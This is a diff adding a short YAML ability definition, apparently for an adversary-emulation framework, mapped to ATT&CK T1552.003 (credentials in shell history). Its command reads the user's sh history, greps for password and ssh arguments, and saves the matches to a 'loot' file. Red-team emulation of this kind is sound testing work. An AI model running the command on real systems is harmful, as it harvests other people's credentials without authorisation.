@@ -1,0 +1,15 @@
+- description: 'Search through sh history for specifice commands we want to capture
+
+    '
+  id: 851e71be-45b3-1965-ee6b-4eb23674ab27
+  name: Search Through sh History
+  platforms:
+    linux:
+      sh:
+        cleanup: ''
+        command: cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1552.003
+    name: 'Unsecured Credentials: Bash History'
